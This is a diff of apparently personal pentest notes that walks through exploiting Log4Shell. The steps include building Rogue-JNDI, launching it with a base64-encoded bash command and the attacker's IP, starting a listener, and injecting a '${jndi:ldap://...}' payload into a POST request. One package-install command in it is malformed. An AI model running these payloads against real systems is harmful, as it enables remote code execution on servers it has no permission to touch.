@@ -19,11 +19,25 @@ description: 'tl;dr: This page tracks things I have pwn''d before with public ex
 sudo tcpdump -i tun0 port 389
 ```
 
-<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
 * The server will response with `invalid payload` however it is still connecting back to us, check `tcpdump` to ensure the connect back&#x20;
 
-![](.gitbook/assets/image.png)
+![](<../.gitbook/assets/image (7).png>)
+
+* Now install the required packages:
+
+```
+sudo apt update
+sudo apt update install openjdk-11-jdk -y
+java -version
+sudo apt-get install maven
+mvn -v
+```
+
+* After the payload has been created, start the Rogue-JNDI application while passing in the payload as part of the `--command` option and your tun0 IP address to the `--hostname` option.
+
+
 
 ```
 git clone https://github.com/veracode-research/rogue-jndi && cd rogue-jndi && mvn package
@@ -32,9 +46,8 @@ java -jar /opt/rogue-jndi/target/RogueJndi-1.1.jar --command "bash -c {echo,YmFz
 ```
 
 * `--hostname` is your localhost tun0 interface
-* &#x20;
-
-
+* &#x20;Now start your listener&#x20;
+* Going back to our intercepted POST request, let's change the payload to `${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}` and click `Send`
 
 ### Apache Struts2
 
